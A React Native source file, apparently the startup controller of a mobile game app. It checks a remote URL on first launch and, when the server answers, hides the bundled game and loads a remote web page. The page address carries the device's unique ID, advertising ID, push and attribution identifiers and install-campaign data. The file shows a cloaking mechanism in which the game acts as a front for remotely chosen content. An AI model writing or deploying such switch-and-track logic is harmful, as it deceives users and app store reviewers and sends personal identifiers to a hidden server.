import React, { useEffect, useRef, useState } from 'react';
import { Linking } from 'react-native';

import LocalStorage from './Storage';
import EventManager from './EventsManager';
import appsFlyer from 'react-native-appsflyer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import { OneSignal } from 'react-native-onesignal';
import * as Device from 'react-native-device-info';
import Params from './Params';

import StackManager from './AppManagerStack';
import SpinnerRoot from './LoaderRoot';
import FBDeepLink from 'react-native-fb-deeplink';
import { PlayInstallReferrer } from 'react-native-play-install-referrer';
import App from '../../App';


export default function AppManager() {
  const vSpin = <SpinnerRoot />;
  const vGame = <App />;
  const vStack = (lnk, ua) => <StackManager dataLoad={lnk} userAgent={ua} />;

  const [isBusy, setIsBusy] = useState(true);
  const [isGame, setIsGame] = useState(true);

  const rUserId = useRef(null);
  const rAdId = useRef(null);
  const rAppsId = useRef(null);
  const rSub = useRef(null);
  const rOneSignal = useRef(null);
  const rDeviceId = useRef(null);
  const rPushAllowed = useRef(false);
  const rUrl = useRef(null);
  const rUA = useRef(null);
  const rExtra = useRef(null);
  const rUnity = useRef(null);
  const rDeep = useRef(null);
  const rInstall = useRef(null);
  const rAppsInfo = useRef(null);

  const seedUser = async () => {
    const inStore = await LocalStorage.get('userID');
    if (inStore) {
      rUserId.current = inStore;
      return;
    }
    const rnd = Array.from({ length: 7 }, () => Math.floor(Math.random() * 10)).join('');
    rUserId.current = `${Date.now()}-${rnd}`;
    await LocalStorage.save('userID', rUserId.current);
  };

  const pullAdId = async () => {
    ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true).then(res => {
      rAdId.current = res.id || '00000000-0000-0000-0000-000000000000';
      launchManager();
    });
  };

  const probeManager = async () => {
    EventManager.sendEvent(EventManager.eventList.firstOpen);
    const resp = await fetch(Params.bodyLin);
    if (resp.status === 200) {
      await bootOneSignal();
    } else {
      exposeGame();
    }
  };

  const bootOneSignal = async () => {
    const mayAsk = await OneSignal.Notifications.canRequestPermission();
    if (mayAsk) {
      rPushAllowed.current = await OneSignal.Notifications.requestPermission(true);
      await wireAppsFlyer();
    }
    OneSignal.User.addTag('timestamp_user_id', rUserId.current);
  };

  appsFlyer.onInstallConversionData(payload => {
    try {
      const info = payload.data;
      console.log(payload);
      if (!rAppsInfo.current) rAppsInfo.current = JSON.stringify(payload);
      if (JSON.parse(info.is_first_launch) === true) {
        if (info.af_status === 'Non-organic') {
          if (info.campaign?.toString().includes('_')) {
            rSub.current = info.campaign;
            rUnity.current = [
              `af_siteid=${info.af_siteid || ''}`,
              `af_ad=${info.af_ad || ''}`,
              `media_source=${info.media_source || ''}`,
              `af_channel=${info.af_channel || ''}`
            ].map(s => `&${s}`).join('');
            rExtra.current = 'NON-ORGANIC';
          } else {
            rExtra.current = 'CONVERT-SUBS-MISSING-SPLITTER';
          }
        } else {
          rExtra.current = 'ORGANIC';
        }
        composeUrl();
      }
    } catch {
      composeUrl();
    }
  });

  const composeUrl = () => {
    OneSignal.User.getOnesignalId().then(id => {
      OneSignal.login(rUserId.current);
      rOneSignal.current = id;
      const [, mid] = Params.bodyLin.split('.');
      const token = mid.split('/')[1];
      const pieces = [
        `?${token}=1`,
        `appsID=${rAppsId.current}`,
        `adID=${rAdId.current}`,
        `onesignalID=${rOneSignal.current}`,
        `deviceID=${rDeviceId.current}`,
        `userID=${rDeviceId.current}`,
        mkSubs(rSub.current || rDeep.current),
        `&info=${rAppsInfo.current}`,
        `timestamp=${rUserId.current}`,
        rUnity.current || ''
      ].filter(Boolean).join('&');
      rUrl.current = Params.bodyLin + pieces;
      LocalStorage.save('link', rUrl.current);
      showManager(true);
    });
  };

  const showManager = first => {
    if (first && rPushAllowed.current) {
      EventManager.sendEvent(EventManager.eventList.push);
    }
    EventManager.sendEvent(EventManager.eventList.web);
    setIsGame(false);
    setIsBusy(false);
  };

  const mkSubs = str => {
    if (!str) return '';
    const parts = str.split('_');
    if (parts.length === 1 && parts[0] !== 'asa') return '';
    return parts.map((v, i) => `sub_id_${i + 1}=${v}`).join('&');
  };

  const wireAppsFlyer = async () => {
    appsFlyer.initSdk({
      devKey: Params.keyApps,
      appId: Params.appID,
      isDebug: false,
      onInstallConversionDataListener: true,
      onDeepLinkListener: true,
      timeToWaitForATTUserAuthorization: 7
    });
    appsFlyer.setAdditionalData({ af_referrer_custom: rInstall.current });
    appsFlyer.getAppsFlyerUID((_, id) => { rAppsId.current = id; });
  };

  const launchManager = async () => {
    const cached = await LocalStorage.get('link');
    if (cached) {
      appsFlyer.initSdk({
        devKey: Params.keyApps,
        appId: Params.appID,
        isDebug: false,
        onInstallConversionDataListener: false,
        onDeepLinkListener: true,
        timeToWaitForATTUserAuthorization: 7
      });
      rUrl.current = cached;
      showManager(false);
    } else {
      probeManager();
    }
  };

  const exposeGame = () => {
    setTimeout(() => {
      setIsGame(true);
      setIsBusy(false);
    }, 2500);
  };

  const kickstart = () => {
    seedUser();
    OneSignal.initialize(Params.keyOnesignal);

    setTimeout(() => {
      let tapped = false;
      let target = null;

      OneSignal.Notifications.addEventListener('click', ev => {
        tapped = true;
        target = ev.notification.launchURL || null;
      });

      setTimeout(() => {
        EventManager.setParams(rUserId.current);
        if (tapped) {
          LocalStorage.get('link').then(v => {
            rUrl.current = v + '&push=true';
            if (target) {
              EventManager.sendEvent(EventManager.eventList.browser);
              Linking.openURL(target);
            } else {
              EventManager.sendEvent(EventManager.eventList.web_push);
            }
            showManager(false);
          });
        } else {
          (async () => {
            try {
              rDeviceId.current = await Device.getUniqueId();
              rUA.current = await Device.getUserAgent();
              pullAdId();
            } catch {}
          })();
        }
      }, 500);
    }, 200);
  };

  const scanLink = async () => {
    const found = await FBDeepLink.getDeepLink();
    rAppsInfo.current = found;
    rDeep.current = found.split('approved?')[1];
  };

  const probeInstall = async () => {
    PlayInstallReferrer.getInstallReferrerInfo((info, error) => {
      if (!error) rInstall.current = info.installReferrer;
    });
  };

  useEffect(() => {
    probeInstall();
    // (async () => {
    //   await FBDeepLink.initialize(Params.fbAppID, Params.fbClientToken);
    //   await scanLink();
    // })();
    kickstart();
  }, []);

  if (isBusy) return vSpin;
  return isGame ? vGame : vStack(rUrl.current, rUA.current);
}
